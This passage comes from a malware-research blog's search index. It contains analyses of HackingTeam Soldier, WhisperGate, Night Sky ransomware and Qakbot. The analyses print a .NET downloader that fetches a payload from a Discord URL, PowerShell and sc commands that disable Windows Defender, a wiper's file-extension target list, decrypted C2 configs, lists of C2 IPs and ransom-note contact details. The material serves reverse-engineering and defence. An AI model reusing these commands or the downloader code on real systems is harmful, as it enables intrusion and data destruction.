f835308fae01b83396667f18b47882e93b309ee31cc3e9c619a6a405db7e3bbcc&#39;) data = data[:data_len] key = unhex(&#39;60ab854458b00a742c6e8ceb7f1094da&#39;) def decrypt(data, key): from Crypto.Cipher import AES cipher = AES.new(key, AES.MODE_CBC, iv=b&#39; x00&#39;*16) return cipher.decrypt(data) # remember to split the rest of the string after the null decrypt(data, key) . b&#39;{&#34;camera&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0,&#34;iter&#34;:0},&#34;position&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;screenshot&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;photo&#34;:{&#34;enabled&#34;:false},&#34;file&#34;:{&#34;enabled&#34;:false},&#34;addressbook&#34;:{&#34;enabled&#34;:false},&#34;chat&#34;:{&#34;enabled&#34;:false},&#34;clipboard&#34;:{&#34;enabled&#34;:false},&#34;device&#34;:{&#34;enabled&#34;:true},&#34;call&#34;:{&#34;enabled&#34;:false},&#34;messages&#34;:{&#34;enabled&#34;:false},&#34;password&#34;:{&#34;enabled&#34;:false},&#34;keylog&#34;:{&#34;enabled&#34;:false},&#34;mouse&#34;:{&#34;enabled&#34;:false},&#34;url&#34;:{&#34;enabled&#34;:true},&#34;sync&#34;:{&#34;host&#34;:&#34;178.128.215.46&#34;,&#34;repeat&#34;:600},&#34;uninstall&#34;:{&#34;date&#34;:null,&#34;enabled&#34;:false}} x00&#34; x04&amp; xceB xa0 x82 xd4.U x81 x8d xdb x1ai] xae xbdZ x85 x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e&#39; . .text:012EF39B 3D EF BE AD DE cmp eax, 0DEADBEEFh .text:012EF3A0 75 09 jnz short loc_12EF3AB .text:012EF3A2 B8 01 00 00 00 mov eax, 1 .text:012EF3A7 8B E5 mov esp, ebp .text:012EF3A9 5D pop ebp .text:012EF3AA C3 retn .text:012EF3AB 56 push esi .text:012EF3AC 68 58 B5 38 01 push offset config_key .text:012EF3B1 50 push eax .text:012EF3B2 68 57 02 38 01 push offset asc_1380257 ; &quot;#&quot; .text:012EF3B7 E8 84 14 00 00 call mw_aes_decrypt . import pefile import re import struct pe_data = open(&#39;/tmp/work/ht.exe.fixed&#39;, &#39;rb&#39;).read() pe = pefile.PE(data = pe_data) target_code = pe_data.split(b&#39; xEF xBE xAD xDE&#39;)[1] egg = b&#39; x68(....). x68(....) xe8&#39; m = re.search(egg, target_code) if not m: print(&quot;All hope is lost!&quot;) config_va = struct.unpack(&#39;&lt;I&#39;, m.group(2))[0] key_va_bytes = m.group(1) config_offset = pe.get_offset_from_rva(config_va - pe.OPTIONAL_HEADER.ImageBase) config_len = struct.unpack(&#39;&lt;I&#39;, pe_data[config_offset -4:config_offset])[0] config_data = pe_data[config_offset:config_offset+config_len] tohex(config_data) . b&#39;238ba1f22cb105cdae82eb2dde4e2783c80370198e1bb02c231825e7b2d8c164109e5a4e09c63a36df5ed3c5ce49b825968d386eb9008ed2b6cae3b75cd8ba76d49ab1acf69d46a747934187883b2eb27aaab99dae892693dc714433ec2de2d238a036f5ff492414a6a4928f4bd907342e7fff0dd6e61f2a7675b351842a27bc1ba7d5ad7ebc44a11cfafd136f42644db89db7189c4d152a06b10f0c0a4b40c021d7192a04cd383b17434048768076c7d7eb073ef340c696aa35946aacbe99821352487082660334de43ca4e5e142d78f70dc7cb5b571463c3c3c7caf461eac5411136142b0051914f74859c44610f8e4fdcf4f6c269b03809e3aa67ebc3474ece444fe2f5078d36857c17147d834c6cb6ccd9effefca8b24ee01c0868fc1383ef26519c4f573f94b5bbb7b149dcc190f0a08fdc31965d69d97bbcf565e829182b8aa421f46a7e0100180d7ed9d31083b4b68431e0b888bbacb00864f140716359290eb37927ec0ea537b620e1108265f412a28c28c2df0cf1d713880cd874f79872dde1060d29cc7536684d49b504dcfc61c80a1210a5e69533bba05aad0a6dc7239ea90e29e822e0424f06524330a98f40e56c1149bad0350b6c79b1c03963e0cf43dce2f6f6e6412dee43ef937bff51bf345e57bc60c7df2ec4294cc2789547896a53dc43ab5fc15c6a377d0dbab97ff5e091f90fc28ad7acda94543b52bccea2c8f360e03a5fc01cab6d358804037ab20e17facc31293b437b7a22d8c32f835308fae01b83396667f18b47882e93b309ee31cc3e9c619a6a405db7e3bbcc&#39; . .text:013031B6 0F 10 05 7A 01 38 01 movups xmm0, xmmword_138017A .text:013031BD 0F 11 05 58 B5 38 01 movups config_key, xmm0 . key_egg = b&#39; x0F x10 x05(....) x0F x11 x05&#39; + key_va_bytes m = re.search(key_egg, pe_data) if not m: print(&quot;All hope is lost!&quot;) key_data_va = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] key_data_offset = pe.get_offset_from_rva(key_data_va - pe.OPTIONAL_HEADER.ImageBase) key_data = pe_data[key_data_offset:key_data_offset+16] tohex(key_data) . b&#39;60ab854458b00a742c6e8ceb7f1094da&#39; . decrypt(config_data, key_data) . b&#39;{&#34;camera&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0,&#34;iter&#34;:0},&#34;position&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;screenshot&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;photo&#34;:{&#34;enabled&#34;:false},&#34;file&#34;:{&#34;enabled&#34;:false},&#34;addressbook&#34;:{&#34;enabled&#34;:false},&#34;chat&#34;:{&#34;enabled&#34;:false},&#34;clipboard&#34;:{&#34;enabled&#34;:false},&#34;device&#34;:{&#34;enabled&#34;:true},&#34;call&#34;:{&#34;enabled&#34;:false},&#34;messages&#34;:{&#34;enabled&#34;:false},&#34;password&#34;:{&#34;enabled&#34;:false},&#34;keylog&#34;:{&#34;enabled&#34;:false},&#34;mouse&#34;:{&#34;enabled&#34;:false},&#34;url&#34;:{&#34;enabled&#34;:true},&#34;sync&#34;:{&#34;host&#34;:&#34;178.128.215.46&#34;,&#34;repeat&#34;:600},&#34;uninstall&#34;:{&#34;date&#34;:null,&#34;enabled&#34;:false}} x00&#34; x04&amp; xceB xa0 x82 xd4.U x81 x8d xdb x1ai] xae xbdZ x85 x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e&#39; .",
            "url": "https://research.openanalysis.net/vmprotect/malware/unpacking/soldier/hackingteam/2022/01/27/hackingteam_soldier.html",
            "relUrl": "/vmprotect/malware/unpacking/soldier/hackingteam/2022/01/27/hackingteam_soldier.html",
            "date": " • Jan 27, 2022"
        }
        
    
  
    
        ,"post24": {
            "title": "WhisperGate Malware",
            "content": "Overview . Stage 1 - MBR Wiper: a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92 . Stage 2 - Downloader: dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78 . Stage 3 - File Corruptor (injector): 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d . Stage 4 - Final (unpacked on stream): 34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907 . All samples on available on Malshare. . References: . Elastic Security Research - Operation Bleeding Bear | S2W TALON - Analysis of Destructive Malware (WhisperGate) targeting Ukraine | Stage 1 - Analysis From Hexorcist (YouTube) | . Stage 2 - Downloader . This is a .NET binary that is obfuscated with NetReactor. We can use NetReactorSlayer to remove the obfuscation. Just drag the binary over and yes to all options. . TODO: Find a way to identify NetReactor obfuscation -- is there a signature for it? List of .NET de-obfuscation tools . Functionality . Download Stage3 binary from Discord | Binary is downloaded as Tbopbh.jpg and is reversed | Reverse binary and load it directly as a .NET assembly | Call Ylfwdwgmpilzyaph method from loaded Stage3 .NET assembly | . Sample Functions . private static byte[] ChangeFacade() { Facade.ReflectFacade(); try { ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; } catch { } byte[] array = (byte[])typeof(WebClient).GetMethod(&quot;DxownxloxadDxatxxax&quot;.Replace(&quot;x&quot;, &quot;&quot;), new Type[] { typeof(string) }).Invoke(new WebClient(), new object[] { &quot;https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg&quot; }); if (array.Length &gt; 1) { Array.Reverse(array, 0, array.Length); } return array; } private static void FillFacade(MethodInfo[] spec) { foreach (MethodInfo methodInfo in spec) { if (methodInfo.Name == &quot;Ylfwdwgmpilzyaph&quot;) { methodInfo.Invoke(null, null); } } } . Stage 3 - File Corruptor (Injector) . This is a .NET binary that appears to be obfuscated with Eazfuscator and we know from Stage2 that it is loaded as a .NET assembly and the method Ylfwdwgmpilzyaph is where the code starts. Because it is loaded as an assembly it doesn&#39;t have an entrypoint and cannot be launched directly like a regular PE file. . For Eazfuscator we can try some tools like de4dot and EazFizer but they all fail because Eazfuscator has actually virtualized the functions. We need to do this dynamically. . Analysis and Unpacking . Open module in dnspy | Right click assembly Edit Module... | Change Module Type to Windows and add Ylfwdwgmpilzyaph as the Managed Entry Point. | File -&gt; Save Module | Open saved module in dnspy | Locate call to EazFusactor vm in entrypoint u0005 u2005 u2000. u000E u2005 u2000(). u0002( u0005 u2005 u2000. u000F u2005 u2000(), &quot;#6k@H!uq=A&quot;, null); . | Press ctrl+f to open find and search for .invoke | When you find the function with the two invokes on the entrypoint &quot;call&quot; put a breakpoint on them.return u0002.Invoke( u0003, u0005); return ((ConstructorInfo) u0002).Invoke(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, null, u0005, null) . | Start debugger | . The concept behind this method is that Eazfuscator uses the invoke each time it calls into a virtualized function. By putting a breakpoint here we can monitor and intercept the arguments for each call. Each time we break we can inspect the arguments then run until we break again at the next call. . Functionality . The sample checks if it is running as admin, if it isn&#39;t it will launch itself again elevated and teminate. | The sample drops a VBS script %TEMP% Nmddfrqqrbyjeygggda.vbs that attempts to exclude C: from Windows Defender CreateObject(&quot;&quot;WScript.Shell&quot;&quot;).Run &quot;&quot;powershell Set-MpPreference -ExclusionPath &#39;C: &#39;&quot;&quot;, 0, False . | Drops AdvancedRun.exe in %TEMP% (SHA256: 29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b) | Attempts to stop Windows Defender /EXEFilename C: Windows System32 sc.exe /WindowState 0 /CommandLine &quot;&quot;stop WinDefend&quot;&quot; /StartDirectory &quot;&quot;&quot;&quot; /RunAs 8 /Run /EXEFilename C: Windows System32 WindowsPowerShell v1.0 powershell.exe /WindowState 0 /CommandLine &quot;&quot;rmdir &#39;C: ProgramData Microsoft Windows Defender&#39; -Recurse&quot;&quot; /StartDirectory &quot;&quot;&quot;&quot; /RunAs 8 /Run . | Copy InstallUtil.exe into %TEMP% and launch it | Unpack Stage4 which is reversed and gzipped | Inject Stage4 into InstallUtil.exe | . Helpful Eazfuscator Concepts . Create EXE From Assembly (Add Entrypoint) . . Add Function Call Breakpoint To EazFusactor . . Stage 4 - File Corruptor (Final) . This is a 32bit native Windows binary that has been compiled with MinGW. . Functionality . Use GetLogicalDrives and interate through drives selecting FIXED and REMOTE drives | Recursively iterate through files in all directories except for %HOMEDRIVE% Windows | Compare the file extension against a list of target file extensions | For matching files replace the file contents with 0x100000 byes of xcc | Append a random hex integer to the corrupted file name | . File Extension target list . cmd .HTML .HTM .SHTML .XHTML .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP6 .PHP7 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .OST .MSG .EML .VSD .VSDX .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .ONETOC2 .SNT .JPEG .JPG .DOCB .DOCM .DOT .DOTM .DOTX .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .PPAM .POTX .POTM .EDB .HWP .602 .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .CGM .SLN .TIF .TIFF .NEF .PSD .AI .SVG .DJVU.SH .CLASS .JAR .BRD .SCH .DCH .DIP .PL .VB .VBS .PS1 .BAT .CMD .JS .ASM .H .PAS .CPP .C .CS .SUO .ASC .LAY6 .LAY .MML .SXM .OTG .ODG .UOP .STD .SXD .OTP .ODP .WB2 .SLK .DIF .STC .SXC .OTS .ODS .3DM .MAX .3DS .UOT .STW .SXW .OTT .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .RB .GO .JAVA .INC .WAR .PY .KDBX .INI .YML .PPK .LOG .VDI .VMDK .VHD .HDD .NVRAM .VMSD .VMSN .VMSS .VMTM .VMX .VMXF .VSWP .VMTX .VMEM .MDF .IBD .MYI .MYD .FRM .SAV .ODB .DBF .DB .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .SQ3 .ARC .PAQ .BZ2 .TBK .BAK .TAR .TGZ .GZ .7Z .RAR .ZIP .BACKUP .ISO .VCD .BZ .CONFIG .",
            "url": "https://research.openanalysis.net/whispergate/malware/2022/01/20/whisper_gate.html",
            "relUrl": "/whispergate/malware/2022/01/20/whisper_gate.html",
            "date": " • Jan 20, 2022"
        }
        
    
  
    
        ,"post25": {
            "title": "Night Sky Ransomware",
            "content": "Overview . Sample (packed): 8c1a72991fb04dc3a8cf89605fb85150ef0e742472a0c58b8fa942a1f04877b0 . Sample (dumped/unpacked): 1fca1cd04992e0fcaa714d9dfa97323d81d7e3d43a024ec37d1c7a2767a17577 . References: . First seen from MalwareHunterTream | Sample VT | Sample Malshare | Malware Bazaar | id-ransomware | . Dynamic Analysis . Drops hta ransom note in every directory (NightSkyReadMe.hta) | Uses .nightsky file extension for encrypted files | . Unpacking . The sample is packed with some version of VMProtect, likely a newer version (3?) but I&#39;m unsure. It seems to have some anti-debug that actually works against ScyllaHide but luckily it will run with a debugger attached. MrExodia confirmed that the entrypoint was virutalized but we discovered that the main funcationlity was not. This allowed us to break in the main functionality and use vmpdump to dump the payload and resolve the imports. . Static Analysis . The code is strightforward but it contains a statically linked mbedtls library. To assist with reverse engineering we used lumina to pull down some function names for the mbedtls functions, and we compiled version 3.0.0 of mbedtls and imported the .pdb file to give us access to the library structs in IDA. . OSINT . It seems as though this might be a updated version of Rook Ransomware (January 8, 2022). Many researchers are spreading something what is not true.. Please repair your analytical conclusions.#Rook #ransomware is basically previous version of new #NightSky - delivered VMProtected (will be shared later).Facts about #Rook in pictures!!!@malwrhunterteam@cPeterr pic.twitter.com/63bTaWDDmp . &mdash; Jiří Vinopal (@vinopaljiri) January 9, 2022 &gt; Many researchers are spreading something what is not true.. Please repair your analytical conclusions. #Rook #ransomware is basically previous version of new #NightSky - delivered VMProtected (will be shared later). Facts about #Rook in pictures!!! . . . . Dynamically Extracted IOCs . RSA Public Keys . --BEGIN PUBLIC KEY-- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwetDt+9kp5JJGCb3YrqH 48g0rxFIaj5/NjMBvxtpa+7nO/lS0FQXxWJO78dTT6xW/UgVLPK4MvbGeIj17aQF SqGHbRxTeoPrHufp4sM4J2IQYLc6YLYZMS6XT02rHOjumBJpEKyROQ+df5KU/06o Rrhljc0Qco+qW8q/xYJQ9VFa87IJM6WM3wsydHVDDeGuWi4/PMUT4/GAa8/WMUYW 9Ebw7/hXd/aNX5LykeonN+nkJfbj1fZNTU81tc8Kx4rykLvMVE1H3AaT5ssCBt7p AFkLLjplOXz3XmhH+J5vm5Ifi7T85j4D6O03qocO2gwezIikCDU2YAOOpJzkb5Ab +wIDAQAB --END PUBLIC KEY-- . --BEGIN PUBLIC KEY-- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnw/AqzVYc7H6A34K3MQ6 J8nJeaCSegiSOIjhxveQeocKp6TzvL6W3usuMbJKGfL9b19KkiYYyK0WAJ/gsIpq DH7xLCeOq8Lttp07PJmpyOLzzSyuSRKY3E7uSATXMzvJq4OuIkAcwWdce8OnQfS0 17VxNISQU6XQMjt81sqHTzvmg3DaeoqGb1oISWyDoRMFd5Akt04Iw//aNIoGIBvh e/HP71LQpbyzb0RY0HBQuk3zlIDK6J5Hvr+Bkd4Tr5oh/oBya6RX7gW5t1FkY42c /maunB4PiPgHiPdHtJ1LQE+EtSLWU4ZCc0finaLBh3ooySIcsLP9ehlWds1h1ZWN 2QIDAQAB --END PUBLIC KEY-- . TODO: Why are there two RSA keys? . Ransom Note IOCs . Contact information Web Chat: You can use the username and password provided by us to login to the chat room to communicate with us. URL:https://contact.nightsky.cyou username:user-kdwckin password:kdjfikerjijJHDUFIGjk3289 Email: You can contact us by email. EMAIL ADDRESS:akij@nightsky.cyou -- Data release website Where we use to disclose the data of customers who do not pay http://gg5ryfgogainisskdvh4y373ap3b2mxafcibeh2lvq5x7fx76ygcosad.onion -- Remark How to access dark web sites:https://www.youtube.com/watch?v=NpXEQHDOA5o . Mutex . The mutex tset123155465463213 is used to prevent multiple cuncurrent versions of the ransomware. This might be a nice vaccine? . Encryption . TODO .",
            "url": "https://research.openanalysis.net/vmprotect/night%20sky/ransomware/malware/2022/01/06/nightsky_ransomware.html",
            "relUrl": "/vmprotect/night%20sky/ransomware/malware/2022/01/06/nightsky_ransomware.html",
            "date": " • Jan 6, 2022"
        }
        
    
  
    
        ,"post26": {
            "title": "Qakbot / Qbot",
            "content": "Overview . Sample (unpacked): 670e990631c0b98ccdd7701c2136f0cb8863a308b07abd0d64480c8a2412bde4 . References: . Unpacked Sample - Malshare | Malware Bazaare | AGDC Config Extractor Tutorial | Malpedia Articles | UnpacMe | . Expected C2 Config . The following are c2 IPs that we expect to be in the config based on our sandbox output. . 32.221.229.7:443 140.82.49.12:443 24.152.219.253:995 182.56.99.126:443 76.169.147.192:32103 218.101.110.3:995 89.101.97.139:443 82.152.39.39:443 176.24.150.197:443 96.37.113.36:993 68.186.192.69:443 59.88.168.108:443 75.110.250.187:443 182.191.92.203:995 89.165.88.95:443 103.142.10.177:443 45.9.20.200:2211 24.95.61.62:443 194.36.28.26:443 78.101.82.198:2222 37.211.157.100:61202 70.163.1.219:443 31.215.99.73:443 103.143.8.71:6881 59.6.7.83:61200 63.153.187.104:443 14.96.79.22:61202 93.48.80.198:995 24.53.49.240:443 94.200.181.154:995 149.135.101.20:443 24.178.196.158:2222 209.210.95.228:32100 78.101.82.198:443 67.209.195.198:443 96.80.109.57:995 80.14.196.176:2222 38.70.253.226:2222 24.222.20.254:443 217.165.123.47:61200 74.15.2.252:2222 217.128.93.27:2222 102.65.38.67:443 190.73.3.148:2222 79.167.192.206:995 95.5.133.68:995 114.79.148.170:443 120.150.218.241:995 186.64.87.213:443 65.100.174.110:443 96.21.251.127:2222 136.232.34.70:443 63.143.92.99:995 136.143.11.232:443 39.49.27.10:995 111.125.245.116:995 41.228.22.180:443 217.164.247.241:2222 83.110.107.123:443 76.25.142.196:443 74.5.148.57:443 65.128.74.102:443 67.165.206.193:993 173.21.10.71:2222 71.74.12.34:443 94.60.254.81:443 23.233.146.92:443 73.151.236.31:443 79.160.207.214:443 213.120.26.24:443 89.137.52.44:443 75.188.35.168:443 109.12.111.14:443 106.51.48.170:50001 68.204.7.158:443 78.101.82.198:995 80.6.192.58:443 41.96.250.164:995 114.79.145.28:443 188.54.96.91:443 105.198.236.99:995 50.238.6.36:443 65.100.174.110:8443 70.51.134.181:2222 117.248.109.38:21 86.98.53.83:443 182.176.180.73:443 217.165.11.65:61200 103.143.8.71:995 50.237.134.22:995 187.189.86.168:443 100.1.119.41:443 2.178.67.97:61202 86.198.237.51:2222 88.253.171.236:995 73.171.4.177:443 40.134.247.125:995 72.252.201.34:995 190.39.205.165:443 187.172.146.123:443 92.167.4.71:2222 189.30.244.252:995 105.111.124.76:443 84.199.230.66:443 14.96.67.177:443 182.56.57.23:995 87.70.93.215:443 93.48.58.123:2222 73.5.119.219:443 75.169.58.229:32100 173.71.147.134:995 69.46.15.180:443 23.82.128.108:443 5.36.7.212:443 200.75.131.234:443 82.77.137.101:995 187.201.90.81:443 24.55.112.61:443 201.172.31.95:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:443 207.246.112.221:995 216.238.72.121:995 216.238.71.31:443 27.223.92.142:995 24.229.150.54:995 117.198.149.221:443 . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . String Tables . key = unhex(&#39;efb05bc91c9c83400d08dd5087959b8b72a7a75b36b8d290c42ddbc22d292414ed86a03f3672a15b8da8bae6c737a55506eb623c9735a5fb41f213f30e4816fc32d9c4ecf873b394b869545cc2f382562e46cad089290ba543bd0000a990b9399a24d735&#39;) data = unhex(&#39;8cdf29ac4ff9f136646bb803eff0f7e75cc2df3e0de8b1f38a7996ad4307416c88bdee6b6426f238ecc69483bf52a51844aa2f6ff247d39222973d96762d2d9150b8a98b8d1a9df1c00c5479918af1224b2b98bfe65d2ef910c49ce7149e2aa8df257578b13ff5f0e9a517dfc25b7bcb9fe08143bcec48514114bec9e66b6133f31ed1e5d385b558d63a609f3e71fe56d794329d75872e0978885bb4a5808f12c1f1e42c2c3fae86f13f4128b98cd9487fcd30bdb8f2119655dbcd0f5f4ddd3df7e7b5ef1ecba71759dbb3fc8842acc24f4d457388e8d411530ac460fbdbc983b5418b307e8e594ae446c0893782639f202d6e9932b8b29cd616cbf18302352ab681e32f0023b2b5896a31f90af3bbf509875dd0df1f526db020f3ec9be81fc3893e4eddd2c38b6b8f956c7b6148bae9d70902419315e2ccdfba8a5ec62769980d5ae369f2922f967c847d68529954bcaa889d01efc7c8103a39b6f3de0a001abab9f94c57a53898df8203ec2caedb653d3a8575b7a7c3a6579795031388e0c8e908ebf0750c1426b5ab850f042a846bbff097c3f705fd7036d93a19a707fdde71c04bd63e7a4ed902eb9c91f804d1fe960e3b5cec90e4312e16abb3e2486cc030bd86c033a56cfdf329236cb13c87fcf6ea15c2882b5cc8b7f7c40888bb5e5d4179bfe9cf4b132ef222fefff5b1f103f91a688e264efe43c0a824866683202d6e99328ead82cb41ecc4d6391132b69af62f2e33b9b5fb1a398b27d183b07e9a65eff725605ab23ff3b0c7d80bd4d33e5b8be0cca95ea9a3034c5c71edd1f26c775cc423e8a8cc84b437c62665990b4ce31bc08324f276947b2138994abcff899301ddbadd11315c84b2ce056b46e4b4e5450bd120cd8bc536b932f9fb25367fb43ee3e0f6fb5cc2df3e0ddda6f8a15fbea34107416c88bdd7564417d233ecdad1c8a24fc06e639f1659e556c48b6f976b96353a628f5cb0a28ad616cbf18319353fa996f6354f36bea5fb4c25c03bd8d4d33ab968e9f125636da97ee2edfe8b11d5de2b428be0bea041b7c26c656841bec3f26c6620ee1dc4e4ffe6b45fc922679b0b12f359c9fb329767867e2966951cbda880f805d8fdcb0c7a39ba96b93f5d23b9a2ff076edd26868cdd3fa87bf9ed34236da53587a4a9b84692916c0e81e290a55bbca15e5b526cc3e3d85a0d13d73cfeded99ee952dd303d8a145bf446d78d20dc768b6b48798c57b7c498c556c0b4cc003939ffa8a7661c22f0f5b91b6f9f668dddd476ec2caee76f2838ef34a8b0ffd672f4d2395bd1a6c3a540abae485a677b83f5c5514272f632e3dbce87f737e627638a16599710f6823286769e5c277988178597958b24fcc38e5d0839ba83ee395c23b8feec516ea566eec1956bff789ca96f2708b033f4fdf2ee1ec3893e4eddd2f1b45db7ab4e48507d82e88f471b01c934eec3cd87b15288336a8a11549766eabd15a552a14b14419345eff0dfca3ddcf0dd351935a181ed254120bef0c8477fcc0edc83c73abb79c0d0307446b82487e2e8b92d94957552d4be90e17ea2b1594c494682e9d41a6a21d828dae7edd0f36bdd226f91034ef31bc08324f261966966738457f985a8bc5391dcf3251900e780a0760120eafffd092ed66392999079ec6fbea36f6928ff75f4b79bf81cdfcf3069dabde2a048a99d4050537a8986f35a4252ce39e7fff7af9452d7236f88071caa15e29e35bd71996b2b62d410aead829514dee0cb53767ce4d3a02d472bbab5fb5a64cb22c986df358579eae62c3061b020e2e7e8e41cc6d33e4b998eccea71fea1424650488eefcd4904508851decdcec6a855cf0574840159e44685c661b57687412a7c9951adecce8f1addf9df04202ff881ed395a1aa9b9e45f399f14d4818369964ceeec23687bae72ae9ffef900f5c22f43cabcb0f90db4a04779567b8ee3d34c1831d33eecdcdfcee512d6772acb0c49fb5989db2f877fdf2e2663901bd9b39c9b12c3badc05385cb196ee334d32ead0de40659671e2acdf36b969e8e6325e71ae24e2f89bd80bd4f014618ee690a240b4ac034c5c71edc7d65e4506f22dee86df9ea237ce3074850750a4078b9f2d9e13d65d31658857b49683970796c8eb102728a79eb164722ba5b2fa5065c66dd897d55ba779e8e230643bef7ee3f9f78b31c8c92f53d6a6bd9054aba7170945649deac95c5706c834e387c2cbb040d27860841051ba40d797249c709c6a2d72fc1789b6839f01d2f9fe003839b1dbfa6e186fef8cc0477fc031d38ac47b8c64ecef2f7f6daf0ceef0e3fb1ec8d53e18ddaaf5c44cbfb44c594d27dfa8c4535a72f214cbfceda79572f9186f881053e45ac38f1da57a9d6a27618f129da18a9d1dd7f1ca351124a19ff7254729a4a3d5796ad12bceefd36195409ca613747ba935eac7f4e40682fb3e4ec8beffb648a9ec485141148cf5d757591dca23a3ccd68ac712f62c759f0751c55aca8f64ae768b7e24798e57abea898016b3fccc1d242fc2a0ed305a31aba2ec7546cc20cf80c334af689ca6107f67ba22e6f8dde21ec2d47e6af1bce4a15fb5a75909616c9deacf4d5300fd32e8d0ca8aa845c07b6393073cc44cd68f249f20c10e2c61995cbead829d5dd6ecdd52302ba381e9324f23a7bfe7076edd26868bc72ca868ffeb257f26b828e295cce21c94950466d0abe3ad4ebaae604c497b9fffa04b4f02c466bdd09fd6f36fa57055921148f258f7942e8636af5d31658857b4f7dea40bc4fdc2082638ec96fa332e31bea3e859629671938bdc37c932f8e2340d69ae27effaf4e01389c3375ab89ef1b75999ad425d7164b9efcd5a3621e417c8ebeec6ed17e30749a6426bfe5b96c91ea2619c6d2d658f5dabc4a19709daf8d4087b69ecc3a27e792fa4b4e65e78850de9cf8675f827bcf136373fea7eb7bcbbcc17c4cc34198ae2a1f41deaf21c09627d9fe3c6504e5d966ca398bab1ae59966759bb1053f450d68841a57a9d3d7a49b85baaafa88a1ac5f1b8273531a7f3e4254629b9a4ec5b38976dd897d55b9a6ce5cd25795ab820e8e7efe21cc0a7080c909fdcff16959516121f58baafa068673ea138b7f4d28fa552d7336f874c4fee46d68841a15cb55a1f57ae778589859b01dce7d70f20008f9ae1244135a5b6fd094acb37d4a2d137be7deee61c5e78a41ee2e19bd817d3873454d285dd8d7ebeb05b404771cdbb80785306ee39e7cdd992ef15d23c68860551e3469fd961d433d175217b8c57abb7839612c7fdd7071839b496ee6b472bbab5fb5a64cb22c98acd7a9540b2df656e67b224dbf6f2e6049585723cebb7e4e44eb4ae6b4048719ea69d1f5910cb0cc0e1e983b541cc3663c52744f256f48e24806adb2c1b739057bab0ccd253f5e6d704741f8bbedd124f32ab96e0456e8514d58ac23ee952fdee252d35fd77a2e6bca95bade134449897f1a745fbad4f43627d81e380565852c234e1eed38aa244af3a64812455fb508bb82e826adb2c6d65de1bd38a898007b3f5d90c363fa696e73f4821a2b9e04661ce2fd081df34bc6cedf133797da829f1e2e3f20bc6dd5b75d9a2e4ad42b5ee694c57779fefd04b5f1dcf77dbcdd482a845890363991155f85b89b22f8167926224529d46bce8a59600c7f5d4050733b781e1330216abb3e2486cc00ddc82d55b9a65eff725605ab23ff395c8ce3ee2e40f1692f2d6966296e26c47507dbbefd24a4522d334e9ddd992c712f62c759f0751c55aca8f64ae408a7d1f59ab04ed98819711c0edd60a7a39ba9682214728a3beec5d25c12fd1eff334a471fded244161b33587c6dec737e4f37b1c9894c28b60fb9544471726b2c9d05a4413d532e3cfe99fb443c038069c0b52e441c4cb1d9676956f3d7a88328b8ba3ac2ff0ddf53f665c8192f2224729a4d0da664df114fcbdf5078475fff12f7e67bb24dbc2f2e516c8d02816fcb7f6a143bfa75f75776494c8c54b363cf50edeede8c88376f155458a1248fe5acbd7059760907c2166885bb6aac0bc16c5fddb0c1d18eebee3385b20abb3fd5c79c03191a1d136ac30cccd10496dab39e4f0d2cf5ef4c22940d1b1f5e87eafa3595c571483f2c4535a5cc537e1a8eeb49272a50647bd2358fa5ccba82480659a6d2d38994abcffbf9905e0f1ca1f3d3fa7dde72e4b46e4b5f14c0bcc2edc88d574a36cf9e4407a65b433a7e5e9e411c2d42816dbb3fca80db8b048485071cda1c5474613cf3fad8a9fb5e517877055c945369751cc88319e728a40297b9932f9a29e971e9394cd1a312ea79df4784a2aa6d0fc5b67c82cd3c1d437a51cd5ed297961bc3ceeeff2e51587c33a42d9b0f1b748f5ec03294777bef0c37745068f3ef5cdbac3944ed62163863053f84180a7128b60876b2525ce6e96aa89bc01dae2dd3a3128b783ac335623ca92f05d6ee326d38cd575ac64f983176466ee62d8c5e9e416d2c42f36ef81f3b644abb6037a487188f6801a4378f23ef988d584ad60e81c558e104afe56c0db7cd254967a07749657bab0c4da04dafad50e3928b1c9a0760866e8abe0447bc031ce80de3abd75f3ed0c687eb83cbafcf6fb17d5d43458d9a6f5b90c879e0375017782e9d463551bcc2dbf8a93ec9452d1756989086ce55ac69e328133ce2e0f73887dbbae899b079bb6cf003a31a59ef6251434a5bffd7568cc2ecbdd8a0ca072afb11f5d7ab233e2e6e8a95badc22944eab7e4b15fb5e210094b7687d6d2505517d228a3ebc883a643c07d24ce111ebb15cb8e2d9e3fd3603d7ad012b7b180d179e4c7fb1b3d2cb6ddd13a4b23baf0bb193b9549ee8ac47baf6ff3a37d2d4baf35e6e1fec410cdc2384290f0c3a75fb2b259404a73c3c0c9535321